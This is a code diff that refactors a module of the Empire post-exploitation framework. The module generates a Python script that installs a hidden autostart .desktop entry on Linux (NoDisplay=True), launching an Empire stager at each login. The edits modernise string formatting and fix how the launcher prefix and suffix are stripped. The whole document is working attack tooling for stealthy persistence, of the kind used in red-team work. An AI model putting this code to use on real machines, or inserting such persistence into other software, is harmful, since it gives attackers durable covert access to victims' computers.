@@ -1,12 +1,10 @@
-from __future__ import print_function
-
-from builtins import object, str
 from typing import Dict
 
 from empire.server.core.module_models import EmpireModule
+from empire.server.utils.string_util import removeprefix, removesuffix
 
 
-class Module(object):
+class Module:
     @staticmethod
     def generate(
         main_menu,
@@ -19,28 +17,26 @@ class Module(object):
         file_name = params["FileName"]
         listener_name = params["Listener"]
         launcher = main_menu.stagers.generate_launcher(listener_name, language="python")
-        launcher = launcher.strip("echo").strip(" | python3 &")
-        dt_settings = """
+        launcher = removeprefix(launcher, "echo ")
+        launcher = removesuffix(launcher, " | python3 &")
+        dt_settings = f"""
 [Desktop Entry]
-Name=%s
-Exec=python -c %s
+Name={file_name}
+Exec=python -c {launcher}
 Type=Application
 NoDisplay=True
-""" % (
-            file_name,
-            launcher,
-        )
-        script = """
+"""
+        script = f"""
 import subprocess
 import sys
 import os
-remove = "%s"
+remove = "{remove}"
 dtFile = \"\"\"
-%s
+{dt_settings}
 \"\"\"
 home = os.path.expanduser("~")
 filePath = home + "/.config/autostart/"
-writeFile = filePath + "%s.desktop"
+writeFile = filePath + "{file_name}.desktop"
 
 if remove.lower() == "true":
     if os.path.isfile(writeFile):
@@ -56,15 +52,9 @@ else:
     e.write(dtFile)
     e.close()
 
-    print("\\n[+] Persistence has been installed: ~/.config/autostart/%s")
-    print("\\n[+] Empire daemon has been written to %s")
+    print("\\n[+] Persistence has been installed: ~/.config/autostart/{file_name}")
+    print("\\n[+] Empire daemon has been written to {file_name}")
 
-""" % (
-            remove,
-            dt_settings,
-            file_name,
-            file_name,
-            file_name,
-        )
+"""
 
         return script
